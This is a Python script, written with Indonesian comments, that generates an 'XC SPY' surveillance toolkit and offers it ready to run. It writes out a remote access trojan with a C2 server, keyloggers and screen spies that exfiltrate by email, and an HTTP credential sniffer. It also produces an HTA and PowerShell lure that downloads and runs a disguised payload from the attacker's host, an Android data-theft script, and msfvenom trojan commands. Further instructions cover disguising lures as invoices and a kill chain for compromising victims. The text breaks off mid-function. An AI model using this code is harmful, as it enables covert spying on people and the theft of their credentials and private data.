#!/usr/bin/env python3
"""
XC SPY — Person/Device Surveillance Toolkit
Generate tools siap pakai — tinggal copy-paste atau langsung run
Usage: python3 spy.py <CODENAME> [--lhost IP] [--lport PORT]
"""
import sys, os, argparse, socket, time, threading

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; D = "\033[90m"
RST = "\033[0m"; BOLD = "\033[1m"

OUT_DIR = "spy_output"

def banner():
    print(f"""{M}{BOLD}
 ██╗  ██╗ ██████╗    ███████╗██████╗ ██╗   ██╗
 ╚██╗██╔╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
  ╚███╔╝ ██║         ███████╗██████╔╝ ╚████╔╝
  ██╔██╗ ██║         ╚════██║██╔═══╝   ╚██╔╝
 ██╔╝ ██╗╚██████╗    ███████║██║        ██║
 ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝        ╚═╝
{D}       Person & Device Surveillance System{RST}
{D}       XC Hacking Hub — Spy Division{RST}
""")

def ok(msg):     print(f"  {G}{BOLD}[+]{RST} {msg}")
def info(msg):   print(f"  {C}[*]{RST} {msg}")
def saved(path): print(f"  {Y}{BOLD}[SAVED]{RST} {W}{path}{RST}")
def section(t):  print(f"\n{M}{BOLD}{'═'*54}\n  {t}\n{'═'*54}{RST}")
def codeblock(code, lang="python"):
    print(f"\n{D}┌{'─'*52}┐{RST}")
    for line in code.strip().split("\n"):
        print(f"{D}│{RST} {line}")
    print(f"{D}└{'─'*52}┘{RST}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "YOUR_IP"

def save_tool(filename, code):
    os.makedirs(OUT_DIR, exist_ok=True)
    path = os.path.join(OUT_DIR, filename)
    with open(path, "w") as f:
        f.write(code)
    saved(path)
    return path

# ═══════════════════════════════════════════════════════
#  PHANTOM — Pure Python RAT (no Metasploit needed)
# ═══════════════════════════════════════════════════════

def module_phantom(lhost, lport):
    section("PHANTOM — Python RAT (Siap Pakai)")
    info(f"C2: {lhost}:{lport}")

    agent = f'''#!/usr/bin/env python3
# PHANTOM Agent — jalankan di mesin target
# pip install pillow pyautogui pynput psutil
import socket, subprocess, os, sys, time, threading
import base64, json, platform, getpass, struct

HOST = "{lhost}"
PORT = {lport}

def sysinfo():
    import platform, getpass, socket
    return json.dumps({{
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "os":   platform.system() + " " + platform.release(),
        "cwd":  os.getcwd(),
    }})

def shell_exec(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True,
              stderr=subprocess.STDOUT, timeout=15)
        return out.decode(errors="ignore")
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {{e}}"

def screenshot_b64():
    try:
        import pyautogui, io
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[error] {{e}}"

def keylogger_start(sock):
    try:
        from pynput import keyboard
        buf = []
        def on_press(key):
            try: buf.append(key.char or "")
            except: buf.append(f"[{{key}}]")
            if len(buf) > 50:
                try: sock.send(json.dumps({{"type":"keys","data":"".join(buf)}}).encode() + b"\\n")
                except: pass
                buf.clear()
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return "keylogger started"
    except Exception as e:
        return f"[error] {{e}}"

def send(sock, data):
    msg = json.dumps(data).encode() + b"\\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\\n"):
        chunk = sock.recv(4096)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            send(s, {{"type": "hello", "info": json.loads(sysinfo())}})
            while True:
                cmd = recv(s)
                t = cmd.get("cmd", "")
                if t == "shell":
                    out = shell_exec(cmd["data"])
                    send(s, {{"type":"out","data":out}})
                elif t == "screenshot":
                    send(s, {{"type":"screenshot","data":screenshot_b64()}})
                elif t == "keylog":
                    out = keylogger_start(s)
                    send(s, {{"type":"out","data":out}})
                elif t == "ls":
                    try:
                        files = os.listdir(cmd.get("data", "."))
                        send(s, {{"type":"out","data":"\\n".join(files)}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "cd":
                    try:
                        os.chdir(cmd["data"])
                        send(s, {{"type":"out","data":f"cwd: {{os.getcwd()}}"}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "download":
                    try:
                        with open(cmd["data"], "rb") as f:
                            data = base64.b64encode(f.read()).decode()
                        send(s, {{"type":"file","name":cmd["data"],"data":data}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "sysinfo":
                    send(s, {{"type":"out","data":sysinfo()}})
                elif t == "exit":
                    break
            s.close()
        except:
            time.sleep(10)

connect()
'''

    server = f'''#!/usr/bin/env python3
# PHANTOM Server — jalankan di mesin lo (C2)
import socket, json, base64, os, sys, threading, time
from datetime import datetime

HOST = "0.0.0.0"
PORT = {lport}
agents = {{}}

def send(sock, data):
    msg = json.dumps(data).encode() + b"\\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\\n"):
        chunk = sock.recv(65535)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def handle_agent(conn, addr):
    aid = f"{{addr[0]}}:{{addr[1]}}"
    try:
        hello = recv(conn)
        info = hello.get("info", {{}})
        agents[aid] = {{"sock": conn, "info": info, "addr": addr}}
        print(f"\\n\\033[92m[+] Agent: {{aid}} | {{info.get('user','?')}}@{{info.get('host','?')}} | {{info.get('os','?')}}\\033[0m")
        print(f"\\033[95mPHANTOM\\033[0m \\033[90m»\\033[0m ", end="", flush=True)
    except:
        pass

def agent_shell(aid):
    agent = agents.get(aid)
    if not agent:
        print(f"Agent {{aid}} not found"); return
    sock = agent["sock"]
    info = agent["info"]
    print(f"\\n\\033[93m[SESSION]\\033[0m {{info.get('user')}}@{{info.get('host')}} | \\033[90mCtrl+C = back to menu\\033[0m")
    while True:
        try:
            cmd = input(f"\\033[91m{{info.get('host','?')}}\\033[0m $ ").strip()
            if not cmd: continue
            if cmd == "exit": break
            elif cmd == "screenshot":
                send(sock, {{"cmd":"screenshot"}})
                res = recv(sock)
                ts = datetime.now().strftime("%H%M%S")
                fname = f"screenshot_{{ts}}.png"
                with open(fname,"wb") as f:
                    f.write(base64.b64decode(res["data"]))
                print(f"\\033[92m[+] Saved: {{fname}}\\033[0m")
            elif cmd.startswith("download "):
                path = cmd[9:]
                send(sock, {{"cmd":"download","data":path}})
                res = recv(sock)
                if res["type"] == "file":
                    fname = os.path.basename(res["name"])
                    with open(fname,"wb") as f:
                        f.write(base64.b64decode(res["data"]))
                    print(f"\\033[92m[+] Downloaded: {{fname}}\\033[0m")
                else:
                    print(res.get("data",""))
            elif cmd.startswith("cd "):
                send(sock, {{"cmd":"cd","data":cmd[3:]}})
                print(recv(sock).get("data",""))
            elif cmd == "keylog":
                send(sock, {{"cmd":"keylog"}})
                print(recv(sock).get("data",""))
            elif cmd == "sysinfo":
                send(sock, {{"cmd":"sysinfo"}})
                print(recv(sock).get("data",""))
            else:
                send(sock, {{"cmd":"shell","data":cmd}})
                print(recv(sock).get("data","").strip())
        except KeyboardInterrupt:
            print(); break
        except Exception as e:
            print(f"[!] {{e}}"); break

def menu():
    while True:
        print(f"\\n\\033[95m{'─'*40}\\033[0m")
        print(f"  Agents online: {{len(agents)}}")
        for i,(aid,a) in enumerate(agents.items()):
            info = a['info']
            print(f"  [{{i}}] {{aid}} | {{info.get('user','?')}}@{{info.get('host','?')}}")
        print(f"\\033[95m{'─'*40}\\033[0m")
        try:
            cmd = input(f"\\033[95mPHANTOM\\033[0m \\033[90m»\\033[0m ").strip()
            if cmd.isdigit():
                aid = list(agents.keys())[int(cmd)]
                agent_shell(aid)
            elif cmd == "list":
                pass
            elif cmd in ("exit","quit"):
                sys.exit(0)
        except (KeyboardInterrupt, IndexError, EOFError):
            print()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(10)
print(f"\\033[95m[PHANTOM C2]\\033[0m Listening on {{HOST}}:{{PORT}}")

def accept_loop():
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()

threading.Thread(target=accept_loop, daemon=True).start()
menu()
'''

    save_tool("phantom_agent.py", agent)
    save_tool("phantom_server.py", server)

    print(f"\n{Y}Cara pakai:{RST}")
    print(f"""
  {C}# Di mesin lo — jalankan C2 server:{RST}
  {G}python3 spy_output/phantom_server.py{RST}

  {C}# Di target — jalankan agent:{RST}
  {G}pip install pyautogui pynput pillow{RST}
  {G}python3 spy_output/phantom_agent.py{RST}

  {C}# Atau compile ke EXE (Windows, tanpa Python):{RST}
  {G}pyinstaller --onefile --noconsole phantom_agent.py{RST}

  {C}# Command setelah konek:{RST}
  {W}shell <cmd>      → exec command{RST}
  {W}screenshot       → capture screen → save PNG{RST}
  {W}download <path>  → ambil file{RST}
  {W}keylog           → mulai keylogger{RST}
  {W}sysinfo          → info sistem target{RST}
  {W}cd <path>        → pindah direktori{RST}
""")

# ═══════════════════════════════════════════════════════
#  SHADOW — Keylogger Standalone
# ═══════════════════════════════════════════════════════

def module_shadow():
    section("SHADOW — Keylogger (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# SHADOW Keylogger — silent, email exfil optional
# pip install pynput
import os, time, socket, platform, getpass, threading
from datetime import datetime
try: from pynput import keyboard
except: os.system("pip install pynput -q"); from pynput import keyboard

# ── Config ──────────────────
LOG  = os.path.join(os.getenv("TEMP", "/tmp"), ".shdw_cache")
MAIL = False          # True = auto kirim via email
TO   = "kamu@gmail.com"
FRM  = "pengirim@gmail.com"
PWD  = "app_password_gmail"
IVTL = 300            # kirim tiap N detik
# ────────────────────────────

buf = [f"[{socket.gethostname()}][{getpass.getuser()}][{platform.system()}][{datetime.now():%Y-%m-%d %H:%M}]\\n"]

SPECIALS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\\n[ENT]\\n",
    keyboard.Key.backspace: "[BS]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.ctrl_l:    "[CTL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.shift:     "[SHF]",
}

def on_press(key):
    try:    buf.append(key.char)
    except: buf.append(SPECIALS.get(key, f"[{key}]"))
    if len(buf) > 80: flush()

def flush():
    global buf
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("".join(buf))
    buf = []

def mail_loop():
    while True:
        time.sleep(IVTL)
        flush()
        if not MAIL: continue
        try:
            import smtplib
            from email.mime.text import MIMEText
            with open(LOG, encoding="utf-8", errors="ignore") as f:
                body = f.read()
            if not body.strip(): continue
            msg = MIMEText(body)
            msg["Subject"] = f"[SHDW] {socket.gethostname()} {datetime.now():%H:%M}"
            msg["From"] = FRM; msg["To"] = TO
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
                s.login(FRM, PWD); s.send_message(msg)
            open(LOG, "w").close()
        except: pass

threading.Thread(target=mail_loop, daemon=True).start()
keyboard.Listener(on_press=on_press).join()
'''
    save_tool("shadow_keylogger.py", code)
    codeblock(code[:800] + "\n# ... (full code di spy_output/shadow_keylogger.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install pynput{RST}
  {G}python3 spy_output/shadow_keylogger.py{RST}

  {C}Compile ke EXE (invisible, no console):{RST}
  {G}pyinstaller --onefile --noconsole shadow_keylogger.py{RST}

  {C}Log tersimpan di:{RST}
  {W}Windows: %TEMP%\\.shdw_cache{RST}
  {W}Linux:   /tmp/.shdw_cache{RST}

  {C}Aktifin email exfil:{RST}
  {W}Set MAIL = True → isi TO + PWD (Gmail App Password){RST}
""")

# ═══════════════════════════════════════════════════════
#  ECLIPSE — Screen Spy
# ═══════════════════════════════════════════════════════

def module_eclipse():
    section("ECLIPSE — Screen Spy (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# ECLIPSE Screen Spy — screenshot diam-diam
# pip install pillow pyautogui
import os, time, io, threading, socket
from datetime import datetime
try: import pyautogui
except: os.system("pip install pyautogui pillow -q"); import pyautogui

# ── Config ──────────────────
INTERVAL = 30         # screenshot tiap N detik
SAVE_DIR = os.path.join(os.getenv("TEMP", "/tmp"), ".eclp")
MAIL     = False
TO       = "kamu@gmail.com"
FRM      = "pengirim@gmail.com"
PWD      = "app_password"
# ────────────────────────────

os.makedirs(SAVE_DIR, exist_ok=True)

def snap():
    try:
        img = pyautogui.screenshot()
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SAVE_DIR, f"{ts}.png")
        img.save(path)
        if MAIL: send_mail(img)
        return path
    except Exception as e:
        return str(e)

def send_mail(img):
    try:
        import smtplib, io
        from email.mime.multipart import MIMEMultipart
        from email.mime.image import MIMEImage
        buf = io.BytesIO()
        img.save(buf, format="PNG"); buf.seek(0)
        msg = MIMEMultipart()
        msg["Subject"] = f"[ECLP] {socket.gethostname()} {datetime.now():%H:%M}"
        msg["From"] = FRM; msg["To"] = TO
        msg.attach(MIMEImage(buf.read()))
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
            s.login(FRM, PWD); s.send_message(msg)
    except: pass

while True:
    snap()
    time.sleep(INTERVAL)
'''
    save_tool("eclipse_screen.py", code)
    codeblock(code[:600] + "\n# ... (full code di spy_output/eclipse_screen.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install pillow pyautogui{RST}
  {G}python3 spy_output/eclipse_screen.py{RST}

  {C}Screenshot tersimpan di:{RST}
  {W}Windows: %TEMP%\\.eclp\\{RST}
  {W}Linux:   /tmp/.eclp/{RST}

  {C}Compile ke EXE:{RST}
  {G}pyinstaller --onefile --noconsole eclipse_screen.py{RST}
""")

# ═══════════════════════════════════════════════════════
#  VENOM — Network Sniffer / MITM
# ═══════════════════════════════════════════════════════

def module_venom(iface="wlan0"):
    section("VENOM — Network Sniffer (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# VENOM Sniffer — intercept HTTP credentials & cookies
# pip install scapy
import re, sys
from scapy.all import sniff, IP, TCP, Raw

# ── Config ──────────────────
IFACE   = "wlan0"     # ganti sesuai interface lo
TARGETS = []          # kosong = semua IP
LOG     = "venom_capture.log"
# ────────────────────────────

KEYWORDS = [
    "password","passwd","pass","pwd","secret",
    "username","user","login","email","token",
    "authorization","cookie","session","auth",
    "credential","apikey","api_key","access_token",
]

def log(msg):
    print(msg)
    with open(LOG, "a") as f: f.write(msg + "\\n")

def extract_creds(payload):
    hits = []
    for kw in KEYWORDS:
        pattern = rf"{kw}[=:]([^&\\s\"\'<>{{}}]+)"
        matches = re.findall(pattern, payload, re.IGNORECASE)
        for m in matches:
            hits.append(f"{kw}={m}")
    return hits

def packet_handler(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    try:
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
    except: return

    src = pkt[IP].src if pkt.haslayer(IP) else "?"
    dst = pkt[IP].dst if pkt.haslayer(IP) else "?"

    if TARGETS and src not in TARGETS and dst not in TARGETS:
        return

    # HTTP Request
    if payload.startswith(("GET ","POST ","PUT ","DELETE ","PATCH ")):
        lines = payload.split("\\r\\n")
        method_line = lines[0]
        host = next((l[6:] for l in lines if l.startswith("Host:")), dst)
        log(f"\\n[HTTP] {src} → {host}")
        log(f"  {method_line}")

        # Extract headers
        for l in lines[1:]:
            if any(k in l.lower() for k in ["cookie","authorization","token"]):
                log(f"  {l}")

        # Extract POST body
        if "\\r\\n\\r\\n" in payload:
            body = payload.split("\\r\\n\\r\\n", 1)[1]
            if body:
                creds = extract_creds(body)
                if creds:
                    log(f"  \\033[91m[CREDS]\\033[0m {' | '.join(creds)}")
                    log(f"  [BODY] {body[:200]}")

print(f"[VENOM] Sniffing on {IFACE} — log: {LOG}")
print("[VENOM] Ctrl+C to stop\\n")
sniff(iface=IFACE, filter="tcp port 80", prn=packet_handler, store=0)
'''
    save_tool("venom_sniffer.py", code)
    codeblock(code[:700] + "\n# ... (full code di spy_output/venom_sniffer.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install scapy{RST}
  {G}sudo python3 spy_output/venom_sniffer.py{RST}

  {C}Ganti interface sesuai lo:{RST}
  {W}ip a           → lihat nama interface{RST}
  {W}IFACE = "eth0" → kalau kabel{RST}
  {W}IFACE = "wlan0"→ kalau WiFi{RST}

  {C}Target spesifik:{RST}
  {W}TARGETS = ["192.168.1.5"] → hanya monitor 1 IP{RST}
""")

# ═══════════════════════════════════════════════════════
#  NEXUS — C2 Server + Agent
# ═══════════════════════════════════════════════════════

def module_nexus(lhost, lport):
    section("NEXUS — C2 Server (Siap Pakai)")
    info("Sama dengan PHANTOM server — NEXUS = multi-agent manager")

    code_server = f'''#!/usr/bin/env python3
# NEXUS C2 Server — multi-agent command center
import socket, threading, sys, json, time, os

HOST = "0.0.0.0"; PORT = {lport}
agents = {{}}; lock = threading.Lock()

def send(s, d): s.sendall((json.dumps(d)+"\\n").encode())
def recv(s):
    b = b""
    while not b.endswith(b"\\n"):
        c = s.recv(4096)
        if not c: break
        b += c
    return json.loads(b.strip())

def handle(conn, addr):
    aid = f"{{addr[0]}}:{{addr[1]}}"
    try:
        hello = recv(conn)
        with lock: agents[aid] = {{"sock":conn,"info":hello.get("info",{{}}),"addr":addr}}
        print(f"\\n\\033[92m[+] {{aid}}\\033[0m | {{hello.get('info',{{}})}}")
        while True: time.sleep(1)
    except: pass
    finally:
        with lock: agents.pop(aid, None)
        conn.close()

def cmd_agent(aid, cmd_str):
    a = agents.get(aid)
    if not a: return "[agent gone]"
    send(a["sock"], {{"cmd":"shell","data":cmd_str}})
    return recv(a["sock"]).get("data","")

def menu():
    print(f"\\033[95m[NEXUS C2]\\033[0m {{HOST}}:{{PORT}}")
    while True:
        try:
            c = input(f"\\033[95mNEXUS\\033[0m » ").strip()
            if c == "list":
                for i,(k,v) in enumerate(agents.items()):
                    print(f"  [{{i}}] {{k}} | {{v['info']}}")
            elif c.startswith("use "):
                idx = int(c[4:])
                aid = list(agents.keys())[idx]
                a = agents[aid]
                print(f"\\n[SESSION] {{aid}} | Ctrl+C = menu")
                while True:
                    try:
                        inp = input(f"\\033[91m{{aid}}\\033[0m $ ")
                        if inp == "back": break
                        print(cmd_agent(aid, inp))
                    except KeyboardInterrupt: break
            elif c in ("exit","quit"): sys.exit(0)
        except (KeyboardInterrupt, EOFError): print(); break
        except Exception as e: print(f"[!] {{e}}")

srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT)); srv.listen(20)
threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int,1)], daemon=True).start()
menu()
'''

    code_agent = f'''#!/usr/bin/env python3
# NEXUS Agent — deploy ke target
import socket, subprocess, json, time, os

C2 = "{lhost}"; PORT = {lport}

def send(s, d): s.sendall((json.dumps(d)+"\\n").encode())
def recv(s):
    b = b""
    while not b.endswith(b"\\n"):
        c = s.recv(65535)
        if not c: break
        b += c
    return json.loads(b.strip())

def run(cmd):
    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode(errors="ignore")
    except Exception as e: return str(e)

import platform, getpass, socket as sock
info = {{"host": sock.gethostname(), "user": getpass.getuser(), "os": platform.system()}}

while True:
    try:
        s = socket.socket()
        s.connect((C2, PORT))
        send(s, {{"type":"hello","info":info}})
        while True:
            cmd = recv(s)
            out = run(cmd.get("data",""))
            send(s, {{"type":"out","data":out}})
        s.close()
    except: time.sleep(10)
'''

    save_tool("nexus_server.py", code_server)
    save_tool("nexus_agent.py", code_agent)
    codeblock(code_server[:600] + "\n# ... (full code di spy_output/nexus_server.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}# Server (di mesin lo):{RST}
  {G}python3 spy_output/nexus_server.py{RST}

  {G}# Agent (di target):{RST}
  {G}python3 spy_output/nexus_agent.py{RST}

  {C}Command di NEXUS shell:{RST}
  {W}list      → lihat semua agent online{RST}
  {W}use 0     → masuk ke agent #0{RST}
  {W}<command> → exec di target{RST}
  {W}back      → balik ke menu{RST}
""")

# ═══════════════════════════════════════════════════════
#  MIRAGE — Social Engineering Lure Generator
# ═══════════════════════════════════════════════════════

def module_mirage(lhost, lport, target="target"):
    section("MIRAGE — Lure Generator (Siap Pakai)")

    # HTA lure
    hta = f"""<html><head><hta:application showInTaskbar="no"/>
<script language="VBScript">
Sub Window_OnLoad
  Set WS = CreateObject("WScript.Shell")
  WS.Run "powershell -w hidden -nop -c \\"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/p.ps1')\\"", 0
  window.close
End Sub
</script></head>
<body><p>Loading document...</p></body></html>"""
    save_tool(f"Dokumen_{target}.hta", hta)

    # PowerShell downloader
    ps1 = f"""# MIRAGE PS1 — download & exec payload
$url = "http://{lhost}/phantom_agent.exe"
$out = "$env:TEMP\\svchost32.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out -WindowStyle Hidden"""
    save_tool("loader.ps1", ps1)

    # Python http server helper
    srv = f"""#!/usr/bin/env python3
# MIRAGE Server — host payload ke target
import http.server, socketserver, os
PORT = 80
os.chdir("spy_output")
Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as h:
    print(f"[MIRAGE] Serving spy_output/ on :{PORT}")
    h.serve_forever()
"""
    save_tool("mirage_server.py", srv)

    print(f"""
  {C}File yang di-generate:{RST}
  {W}spy_output/Dokumen_{target}.hta  → jebak via email / chat{RST}
  {W}spy_output/loader.ps1            → PS1 one-liner loader{RST}
  {W}spy_output/mirage_server.py      → host payload ke target{RST}

  {C}Attack flow:{RST}
  {G}# 1. Compile PHANTOM agent ke exe dulu{RST}
  {G}pyinstaller --onefile --noconsole spy_output/phantom_agent.py{RST}
  {G}cp dist/phantom_agent.exe spy_output/{RST}

  {G}# 2. Jalankan NEXUS/PHANTOM server{RST}
  {G}python3 spy_output/nexus_server.py &{RST}

  {G}# 3. Host file via MIRAGE server{RST}
  {G}sudo python3 spy_output/mirage_server.py &{RST}

  {G}# 4. Kirim .hta ke target → target klik → owned 🔥{RST}

  {C}Cara kirim:{RST}
  {W}Email attachment, Telegram, WA, Discord, Google Drive link{RST}
  {W}Rename: "Tagihan_Listrik.hta" / "Invoice_2025.hta"{RST}
""")

# ═══════════════════════════════════════════════════════
#  SPECTRE — Android Spy Guide + ADB Tools
# ═══════════════════════════════════════════════════════

def module_spectre(lhost, lport):
    section("SPECTRE — Android Spy (Siap Pakai)")

    # ADB spy script
    adb_spy = f"""#!/usr/bin/env python3
# SPECTRE ADB Spy — kalau ada akses ADB ke HP target
# Butuh: adb terinstall + HP target debugging on
import subprocess, os, time

def adb(cmd):
    result = subprocess.run(f"adb {{cmd}}", shell=True,
             capture_output=True, text=True)
    return result.stdout + result.stderr

def pull_data(src, dst):
    os.makedirs(dst, exist_ok=True)
    print(adb(f"pull {{src}} {{dst}}"))

print("[SPECTRE] Connecting via ADB...")
print(adb("devices"))

# Screenshot
print("\\n[*] Screenshot...")
adb("shell screencap -p /sdcard/scr.png")
pull_data("/sdcard/scr.png", "spectre_loot")

# Kontak
print("[*] Contacts DB...")
pull_data("/data/data/com.android.providers.contacts/databases/contacts2.db", "spectre_loot")

# SMS
print("[*] SMS DB...")
pull_data("/data/data/com.android.providers.telephony/databases/mmssms.db", "spectre_loot")

# WhatsApp
print("[*] WhatsApp DB...")
pull_data("/sdcard/WhatsApp/Databases/", "spectre_loot/whatsapp")

# Call log
print("[*] Call log...")
out = adb("shell content query --uri content://call_log/calls --projection number:date:duration:type")
with open("spectre_loot/calllog.txt", "w") as f: f.write(out)

# GPS
print("[*] Last location...")
out = adb("shell dumpsys location | grep 'last known'")
print(out)

# Installed apps
print("[*] App list...")
out = adb("shell pm list packages -3")
with open("spectre_loot/apps.txt", "w") as f: f.write(out)

print("\\n[SPECTRE] Done! Loot: spectre_loot/")
"""
    save_tool("spectre_adb.py", adb_spy)

    print(f"""
  {C}2 mode SPECTRE:{RST}

  {Y}Mode A — ADB (physical access / USB):{RST}
  {G}python3 spy_output/spectre_adb.py{RST}
  {W}Butuh: USB debugging ON di HP target{RST}
  {W}Colok HP → langsung grab kontak/SMS/WA/GPS/screenshot{RST}

  {Y}Mode B — APK Trojan (Metasploit):{RST}
  {G}msfvenom -p android/meterpreter/reverse_tcp \\
    LHOST={lhost} LPORT={lport} \\
    -o spy_output/app_update.apk{RST}

  {G}msfconsole -q -x "use exploit/multi/handler; \\
    set payload android/meterpreter/reverse_tcp; \\
    set LHOST {lhost}; set LPORT {lport}; exploit -j"{RST}

  {C}Post-exploit Android (Meterpreter):{RST}
  {W}dump_contacts / dump_sms / dump_calllog{RST}
  {W}geolocate / webcam_snap / record_mic -d 30{RST}
  {W}download /sdcard/WhatsApp/Databases/{RST}
""")

# ═══════════════════════════════════════════════════════
#  BLACKOUT — Full Arsenal
# ═══════════════════════════════════════════════════════

def module_blackout(lhost, lport):
    section("BLACKOUT — FULL ARSENAL")
    module_phantom(lhost, lport)
    module_shadow()
    module_eclipse()
    module_venom()
    module_nexus(lhost, lport)
    module_mirage(lhost, lport)
    module_spectre(lhost, lport)

    section("BLACKOUT COMPLETE — Summary")
    print(f"""
  {G}Files generated di spy_output/:{RST}
  {W}phantom_agent.py    → RAT agent (deploy ke target){RST}
  {W}phantom_server.py   → RAT C2 server{RST}
  {W}shadow_keylogger.py → Keylogger silent{RST}
  {W}eclipse_screen.py   → Screen spy{RST}
  {W}venom_sniffer.py    → Network sniffer{RST}
  {W}nexus_server.py     → Multi-agent C2{RST}
  {W}nexus_agent.py      → C2 agent minimal{RST}
  {W}mirage_server.py    → Payload HTTP server{RST}
  {W}spectre_adb.py      → Android ADB spy{RST}
  {W}loader.ps1          → PS1 downloader{RST}

  {M}Kill Chain Tergacor:{RST}
  {G}1. python3 spy_output/phantom_server.py  ← C2 up{RST}
  {G}2. pyinstaller --onefile phantom_agent.py ← compile{RST}
  {G}3. python3 spy_output/mirage_server.py   ← host payload{RST}
  {G}4. Kirim .hta ke target → klik → owned 🔥{RST}
""")

# ═══════════════════════════════════════════════════════
#  INTERACTIVE MENU
# ═══════════════════════════════════════════════════════

CODENAMES = {
    "PHANTOM": ("phantom", "Modul 1 — PC Takeover (Pure Python RAT)"),
    "SHADOW":  ("shadow",  "Modul 2 — Keylogger silent"),
    "SPECTRE": ("spectre", "Modul 3 — Android Spy (ADB + APK)"),
    "MIRAGE":  ("mirage",  "Modul 4 — Social Lure generator"),
    "VENOM":   ("venom",   "Modul 5 — Network sniffer MITM"),
    "NEXUS":   ("nexus",   "Modul 6 — Multi-agent C2"),
    "ECLIPSE": ("eclipse", "Modul 7 — Screen spy silent"),
    "BLACKOUT":("blackout","FULL ARSENAL — semua modul"),
    "P":  ("phantom",""), "SH": ("shadow",""),  "SP": ("spectre",""),
    "M":  ("mirage",""),  "V":  ("venom",""),   "N":  ("nexus",""),
    "E":  ("eclipse",""), "B":  ("blackout",""),
}

def show_menu(lhost):
    banner()
    print(f"  {D}IP: {W}{lhost}{RST}  |  {D}Output: {W}{OUT_DIR}/{RST}\n")
    rows = [
        ("PHANTOM","P",  "Modul 1","PC Takeover — Pure Python RAT"),
        ("SHADOW", "SH", "Modul 2","Keylogger — silent email exfil"),
        ("SPECTRE","SP", "Modul 3","Android — ADB spy + APK trojan"),
        ("MIRAGE", "M",  "Modul 4","Social lure — HTA / PS1 / server"),
        ("VENOM",  "V",  "Modul 5","Network sniffer — HTTP creds"),
        ("NEXUS",  "N",  "Modul 6","C2 — multi-agent command center"),
        ("ECLIPSE","E",  "Modul 7","Screen spy — screenshot exfil"),
    ]
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {Y}{'CODENAME':<12}{'KEY':<6}{'MODULE':<10}DESCRIPTION{RST}")
    print(f"  {M}{'─'*50}{RST}")
    for name, key, mod, desc in rows:
        print(f"  {C}{name:<12}{RST}[{W}{key}{RST}] {D}{mod} — {desc}{RST}")
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {R}{BOLD}{'BLACKOUT':<12}{RST}[{W}B{RST}]  {R}FULL ARSENAL — generate semua!{RST}")
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {D}help · clear · exit{RST}\n")

def interactive_menu(lhost, lport, target, iface):
    show_menu(lhost)
    dispatch = {
        "phantom": lambda: module_phantom(lhost, lport),
        "shadow":  lambda: module_shadow(),
        "spectre": lambda: module_spectre(lhost, lport),
        "mirage":  lambda: module_mirage(lhost, lport, target),
        "venom":   lambda: module_venom(iface),
        "nexus":   lambda: module_nexus(lhost, lport),
        "eclipse": lambda: module_eclipse(),
        "blackout":lambda: module_blackout(lhost, lport),
    }
    while True:
        try:
            cmd = input(f"\n  {M}XC-SPY{RST} {D}»{RST} ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {D}DAR DER DOR. Stay dangerous.{RST}\n"); break
        if not cmd: continue
        if cmd in ("EXIT","QUIT","Q"):
            print(f"\n  {D}DAR DER DOR. Stay dangerous.{RST}\n"); break
        if cmd in ("HELP","?"):
            show_menu(lhost); continue
        if cmd in ("CLEAR","CLS"):
            os.system("clear" if os.name != "nt" else "cls")
            show_menu(lhost); continue
        if cmd in CODENAMES:
